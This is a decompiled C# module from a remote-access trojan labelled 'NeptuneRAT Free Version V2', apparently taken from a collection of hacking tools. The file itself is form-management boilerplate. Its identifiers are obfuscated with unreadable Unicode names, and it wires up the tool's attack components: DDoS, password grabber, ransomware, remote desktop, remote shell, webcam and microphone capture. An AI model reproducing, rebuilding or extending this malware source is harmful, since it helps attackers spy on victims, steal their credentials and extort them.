// Decompiled with JetBrains decompiler
// Type: NeptuneRAT.My.MyProject
// Assembly: NeptuneRAT Free Version V2, Version=2.2.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 48C579C5-C5A1-4244-9537-C19C9217B961
// Assembly location: \\VBOXSVR\B4s3\ToxicDatabase-main\Tools\NeptuneRAT\NeptuneRAT.7z\neptunerat.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.ComponentModel;
using System.ComponentModel.Design;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;

#nullable disable
namespace NeptuneRAT.My;

[StandardModule]
[HideModuleName]
[GeneratedCode("MyTemplate", "11.0.0.0")]
internal sealed class MyProject
{
  private static readonly MyProject.ThreadSafeObjectProvider<MyComputer> \u2694️MasonRAT\u270Cــىـ\u0608ـ̍ـ\u060D\u060Bۧٸۏڟ = new MyProject.ThreadSafeObjectProvider<MyComputer>();
  private static readonly MyProject.ThreadSafeObjectProvider<MyApplication> \u2694️MasonRAT\u270Cــــ\u060Dــ\u060A\u060A\u060A = new MyProject.ThreadSafeObjectProvider<MyApplication>();
  private static readonly MyProject.ThreadSafeObjectProvider<User> \u2694️MasonRAT\u270C̍\u0608\u0608ـڅۡ\u060B\u060D\u0608ـــ\u060E = new MyProject.ThreadSafeObjectProvider<User>();
  private static MyProject.ThreadSafeObjectProvider<MyProject.MyForms> \u2694️MasonRAT\u270C\u060Fٺؤ\u060Fـۙـۡ\u060Dـﻻ = new MyProject.ThreadSafeObjectProvider<MyProject.MyForms>();
  private static readonly MyProject.ThreadSafeObjectProvider<MyProject.MyWebServices> \u2694️MasonRAT\u270Cگـ\u0609\u060Fٻـدمـؤ\u060D\u060Cڼ\u060D = new MyProject.ThreadSafeObjectProvider<MyProject.MyWebServices>();

  [HelpKeyword("My.Computer")]
  internal static MyComputer \u2694️MasonRAT\u270Cحڙاـ\u060Dﻼڙۜﻋــء̨\u0608ـۨـٻــ
  {
    [DebuggerHidden] get
    {
      return MyProject.\u2694️MasonRAT\u270Cــىـ\u0608ـ̍ـ\u060D\u060Bۧٸۏڟ.GetInstance;
    }
  }

  [HelpKeyword("My.Application")]
  internal static MyApplication \u2694️MasonRAT\u270Cبڠ\u060A\u0608ٺـﻋٸ\u060Dۡ\u060Eـٺٻ̨ۨٺـ\u060F\u0608
  {
    [DebuggerHidden] get
    {
      return MyProject.\u2694️MasonRAT\u270Cــــ\u060Dــ\u060A\u060A\u060A.GetInstance;
    }
  }

  [HelpKeyword("My.User")]
  internal static User \u2694️MasonRAT\u270C\u0609ـ\u0609ــ̍ــټدڙۙؤـحــ
  {
    [DebuggerHidden] get
    {
      return MyProject.\u2694️MasonRAT\u270C̍\u0608\u0608ـڅۡ\u060B\u060D\u0608ـــ\u060E.GetInstance;
    }
  }

  [HelpKeyword("My.Forms")]
  internal static MyProject.MyForms \u2694️MasonRAT\u270C\u060Dطڞڛ\u060F\u060Dټـٽټ\u060Bطـﻋۨ\u060Dﻼ
  {
    [DebuggerHidden] get => MyProject.\u2694️MasonRAT\u270C\u060Fٺؤ\u060Fـۙـۡ\u060Dـﻻ.GetInstance;
  }

  [HelpKeyword("My.WebServices")]
  internal static MyProject.MyWebServices \u2694️MasonRAT\u270Cڙڙڙۧـ\u0609\u060F\u060F\u0608ٺٺٺټ\u060Aڞ\u060A\u0609ـ
  {
    [DebuggerHidden] get
    {
      return MyProject.\u2694️MasonRAT\u270Cگـ\u0609\u060Fٻـدمـؤ\u060D\u060Cڼ\u060D.GetInstance;
    }
  }

  [EditorBrowsable(EditorBrowsableState.Never)]
  [MyGroupCollection("System.Windows.Forms.Form", "Create__Instance__", "Dispose__Instance__", "My.MyProject.Forms")]
  internal sealed class MyForms
  {
    [ThreadStatic]
    private static Hashtable m_FormBeingCreated;
    [EditorBrowsable(EditorBrowsableState.Never)]
    public ChangePort m_ChangePort;
    [EditorBrowsable(EditorBrowsableState.Never)]
    public DDos m_DDos;
    [EditorBrowsable(EditorBrowsableState.Never)]
    public FM m_FM;
    [EditorBrowsable(EditorBrowsableState.Never)]
    public Form1 m_Form1;
    [EditorBrowsable(EditorBrowsableState.Never)]
    public Fun m_Fun;
    [EditorBrowsable(EditorBrowsableState.Never)]
    public INFO m_INFO;
    [EditorBrowsable(EditorBrowsableState.Never)]
    public Maps m_Maps;
    [EditorBrowsable(EditorBrowsableState.Never)]
    public MIC m_MIC;
    [EditorBrowsable(EditorBrowsableState.Never)]
    public Info m_notification;
    [EditorBrowsable(EditorBrowsableState.Never)]
    public GrabberPass m_PassR;
    [EditorBrowsable(EditorBrowsableState.Never)]
    public Port m_Port;
    [EditorBrowsable(EditorBrowsableState.Never)]
    public NeptuneRAT.Process m_ProcessV;
    [EditorBrowsable(EditorBrowsableState.Never)]
    public Programs m_Programs;
    [EditorBrowsable(EditorBrowsableState.Never)]
    public Ransomware m_Ransomware;
    [EditorBrowsable(EditorBrowsableState.Never)]
    public RemoteDesktop m_RemoteDesktop;
    [EditorBrowsable(EditorBrowsableState.Never)]
    public Sound m_Sound;
    [EditorBrowsable(EditorBrowsableState.Never)]
    public ReomteShell m_TEST;
    [EditorBrowsable(EditorBrowsableState.Never)]
    public WebCam m_WebCam;

    [DebuggerHidden]
    private static T Create__Instance__<T>(T Instance) where T : Form, new()
    {
      if ((object) Instance != null && !Instance.IsDisposed)
        return Instance;
      if (MyProject.MyForms.m_FormBeingCreated != null)
      {
        if (MyProject.MyForms.m_FormBeingCreated.ContainsKey((object) typeof (T)))
          throw new InvalidOperationException(Utils.GetResourceString(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 0)));
      }
      else
        MyProject.MyForms.m_FormBeingCreated = new Hashtable();
      MyProject.MyForms.m_FormBeingCreated.Add((object) typeof (T), (object) null);
      TargetInvocationException invocationException;
      try
      {
        return new T();
      }
      catch (TargetInvocationException ex) when (
      {
        // ISSUE: unable to correctly present filter
        ProjectData.SetProjectError((Exception) ex);
        invocationException = ex;
        if (invocationException.InnerException != null)
        {
          SuccessfulFiltering;
        }
        else
          throw;
      }
      )
      {
        throw new InvalidOperationException(Utils.GetResourceString(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1), invocationException.InnerException.Message), invocationException.InnerException);
      }
      finally
      {
        MyProject.MyForms.m_FormBeingCreated.Remove((object) typeof (T));
      }
    }

    [DebuggerHidden]
    private void Dispose__Instance__<T>(ref T instance) where T : Form
    {
      instance.Dispose();
      instance = default (T);
    }

    [DebuggerHidden]
    [EditorBrowsable(EditorBrowsableState.Never)]
    public MyForms()
    {
    }

    [EditorBrowsable(EditorBrowsableState.Never)]
    public override bool Equals(object o) => base.Equals(RuntimeHelpers.GetObjectValue(o));

    [EditorBrowsable(EditorBrowsableState.Never)]
    public override int GetHashCode() => base.GetHashCode();

    [EditorBrowsable(EditorBrowsableState.Never)]
    internal new System.Type GetType() => typeof (MyProject.MyForms);

    [EditorBrowsable(EditorBrowsableState.Never)]
    public override string ToString() => base.ToString();

    public ChangePort ChangePort
    {
      [DebuggerHidden] get
      {
        this.m_ChangePort = MyProject.MyForms.Create__Instance__<ChangePort>(this.m_ChangePort);
        return this.m_ChangePort;
      }
      [DebuggerHidden] set
      {
        if (value == this.m_ChangePort)
          return;
        if (value != null)
          throw new ArgumentException(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2));
        this.Dispose__Instance__<ChangePort>(ref this.m_ChangePort);
      }
    }

    public DDos DDos
    {
      [DebuggerHidden] get
      {
        this.m_DDos = MyProject.MyForms.Create__Instance__<DDos>(this.m_DDos);
        return this.m_DDos;
      }
      [DebuggerHidden] set
      {
        if (value == this.m_DDos)
          return;
        if (value != null)
          throw new ArgumentException(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 3));
        this.Dispose__Instance__<DDos>(ref this.m_DDos);
      }
    }

    public FM FM
    {
      [DebuggerHidden] get
      {
        this.m_FM = MyProject.MyForms.Create__Instance__<FM>(this.m_FM);
        return this.m_FM;
      }
      [DebuggerHidden] set
      {
        if (value == this.m_FM)
          return;
        if (value != null)
          throw new ArgumentException(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 4));
        this.Dispose__Instance__<FM>(ref this.m_FM);
      }
    }

    public Form1 Form1
    {
      [DebuggerHidden] get
      {
        this.m_Form1 = MyProject.MyForms.Create__Instance__<Form1>(this.m_Form1);
        return this.m_Form1;
      }
      [DebuggerHidden] set
      {
        if (value == this.m_Form1)
          return;
        if (value != null)
          throw new ArgumentException(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 5));
        this.Dispose__Instance__<Form1>(ref this.m_Form1);
      }
    }

    public Fun Fun
    {
      [DebuggerHidden] get
      {
        this.m_Fun = MyProject.MyForms.Create__Instance__<Fun>(this.m_Fun);
        return this.m_Fun;
      }
      [DebuggerHidden] set
      {
        if (value == this.m_Fun)
          return;
        if (value != null)
          throw new ArgumentException(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 6));
        this.Dispose__Instance__<Fun>(ref this.m_Fun);
      }
    }

    public INFO INFO
    {
      [DebuggerHidden] get
      {
        this.m_INFO = MyProject.MyForms.Create__Instance__<INFO>(this.m_INFO);
        return this.m_INFO;
      }
      [DebuggerHidden] set
      {
        if (value == this.m_INFO)
          return;
        if (value != null)
          throw new ArgumentException(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 7));
        this.Dispose__Instance__<INFO>(ref this.m_INFO);
      }
    }

    public Maps Maps
    {
      [DebuggerHidden] get
      {
        this.m_Maps = MyProject.MyForms.Create__Instance__<Maps>(this.m_Maps);
        return this.m_Maps;
      }
      [DebuggerHidden] set
      {
        if (value == this.m_Maps)
          return;
        if (value != null)
          throw new ArgumentException(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 8));
        this.Dispose__Instance__<Maps>(ref this.m_Maps);
      }
    }

    public MIC MIC
    {
      [DebuggerHidden] get
      {
        this.m_MIC = MyProject.MyForms.Create__Instance__<MIC>(this.m_MIC);
        return this.m_MIC;
      }
      [DebuggerHidden] set
      {
        if (value == this.m_MIC)
          return;
        if (value != null)
          throw new ArgumentException(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 9));
        this.Dispose__Instance__<MIC>(ref this.m_MIC);
      }
    }

    public Info notification
    {
      [DebuggerHidden] get
      {
        this.m_notification = MyProject.MyForms.Create__Instance__<Info>(this.m_notification);
        return this.m_notification;
      }
      [DebuggerHidden] set
      {
        if (value == this.m_notification)
          return;
        if (value != null)
          throw new ArgumentException(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 10));
        this.Dispose__Instance__<Info>(ref this.m_notification);
      }
    }

    public GrabberPass PassR
    {
      [DebuggerHidden] get
      {
        this.m_PassR = MyProject.MyForms.Create__Instance__<GrabberPass>(this.m_PassR);
        return this.m_PassR;
      }
      [DebuggerHidden] set
      {
        if (value == this.m_PassR)
          return;
        if (value != null)
          throw new ArgumentException(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 11));
        this.Dispose__Instance__<GrabberPass>(ref this.m_PassR);
      }
    }

    public Port Port
    {
      [DebuggerHidden] get
      {
        this.m_Port = MyProject.MyForms.Create__Instance__<Port>(this.m_Port);
        return this.m_Port;
      }
      [DebuggerHidden] set
      {
        if (value == this.m_Port)
          return;
        if (value != null)
          throw new ArgumentException(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 12));
        this.Dispose__Instance__<Port>(ref this.m_Port);
      }
    }

    public NeptuneRAT.Process ProcessV
    {
      [DebuggerHidden] get
      {
        this.m_ProcessV = MyProject.MyForms.Create__Instance__<NeptuneRAT.Process>(this.m_ProcessV);
        return this.m_ProcessV;
      }
      [DebuggerHidden] set
      {
        if (value == this.m_ProcessV)
          return;
        if (value != null)
          throw new ArgumentException(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 13));
        this.Dispose__Instance__<NeptuneRAT.Process>(ref this.m_ProcessV);
      }
    }

    public Programs Programs
    {
      [DebuggerHidden] get
      {
        this.m_Programs = MyProject.MyForms.Create__Instance__<Programs>(this.m_Programs);
        return this.m_Programs;
      }
      [DebuggerHidden] set
      {
        if (value == this.m_Programs)
          return;
        if (value != null)
          throw new ArgumentException(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 14));
        this.Dispose__Instance__<Programs>(ref this.m_Programs);
      }
    }

    public Ransomware Ransomware
    {
      [DebuggerHidden] get
      {
        this.m_Ransomware = MyProject.MyForms.Create__Instance__<Ransomware>(this.m_Ransomware);
        return this.m_Ransomware;
      }
      [DebuggerHidden] set
      {
        if (value == this.m_Ransomware)
          return;
        if (value != null)
          throw new ArgumentException(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 15));
        this.Dispose__Instance__<Ransomware>(ref this.m_Ransomware);
      }
    }

    public RemoteDesktop RemoteDesktop
    {
      [DebuggerHidden] get
      {
        this.m_RemoteDesktop = MyProject.MyForms.Create__Instance__<RemoteDesktop>(this.m_RemoteDesktop);
        return this.m_RemoteDesktop;
      }
      [DebuggerHidden] set
      {
        if (value == this.m_RemoteDesktop)
          return;
        if (value != null)
          throw new ArgumentException(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 16 /*0x10*/));
        this.Dispose__Instance__<RemoteDesktop>(ref this.m_RemoteDesktop);
      }
    }

    public Sound Sound
    {
      [DebuggerHidden] get
      {
        this.m_Sound = MyProject.MyForms.Create__Instance__<Sound>(this.m_Sound);
        return this.m_Sound;
      }
      [DebuggerHidden] set
      {
        if (value == this.m_Sound)
          return;
        if (value != null)
          throw new ArgumentException(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 17));
        this.Dispose__Instance__<Sound>(ref this.m_Sound);
      }
    }

    public ReomteShell TEST
    {
      [DebuggerHidden] get
      {
        this.m_TEST = MyProject.MyForms.Create__Instance__<ReomteShell>(this.m_TEST);
        return this.m_TEST;
      }
      [DebuggerHidden] set
      {
        if (value == this.m_TEST)
          return;
        if (value != null)
          throw new ArgumentException(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 18));
        this.Dispose__Instance__<ReomteShell>(ref this.m_TEST);
      }
    }

    public WebCam WebCam
    {
      [DebuggerHidden] get
      {
        this.m_WebCam = MyProject.MyForms.Create__Instance__<WebCam>(this.m_WebCam);
        return this.m_WebCam;
      }
      [DebuggerHidden] set
      {
        if (value == this.m_WebCam)
          return;
        if (value != null)
          throw new ArgumentException(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 19));
        this.Dispose__Instance__<WebCam>(ref this.m_WebCam);
      }
    }
  }

  [EditorBrowsable(EditorBrowsableState.Never)]
  [MyGroupCollection("System.Web.Services.Protocols.SoapHttpClientProtocol", "Create__Instance__", "Dispose__Instance__", "")]
  internal sealed class MyWebServices
  {
    [EditorBrowsable(EditorBrowsableState.Never)]
    [DebuggerHidden]
    public override bool Equals(object o) => base.Equals(RuntimeHelpers.GetObjectValue(o));

    [EditorBrowsable(EditorBrowsableState.Never)]
    [DebuggerHidden]
    public override int GetHashCode() => base.GetHashCode();

    [EditorBrowsable(EditorBrowsableState.Never)]
    [DebuggerHidden]
    internal new System.Type GetType() => typeof (MyProject.MyWebServices);

    [EditorBrowsable(EditorBrowsableState.Never)]
    [DebuggerHidden]
    public override string ToString() => base.ToString();

    [DebuggerHidden]
    private static T Create__Instance__<T>(T instance) where T : new()
    {
      return (object) instance == null ? new T() : instance;
    }

    [DebuggerHidden]
    private void Dispose__Instance__<T>(ref T instance) => instance = default (T);

    [DebuggerHidden]
    [EditorBrowsable(EditorBrowsableState.Never)]
    public MyWebServices()
    {
    }
  }

  [EditorBrowsable(EditorBrowsableState.Never)]
  [ComVisible(false)]
  internal sealed class ThreadSafeObjectProvider<T> where T : new()
  {
    internal T GetInstance
    {
      [DebuggerHidden] get
      {
        if ((object) MyProject.ThreadSafeObjectProvider<T>.m_ThreadStaticValue == null)
          MyProject.ThreadSafeObjectProvider<T>.m_ThreadStaticValue = new T();
        return MyProject.ThreadSafeObjectProvider<T>.m_ThreadStaticValue;
      }
    }

    [DebuggerHidden]
    [EditorBrowsable(EditorBrowsableState.Never)]
    public ThreadSafeObjectProvider()
    {
    }
  }
}
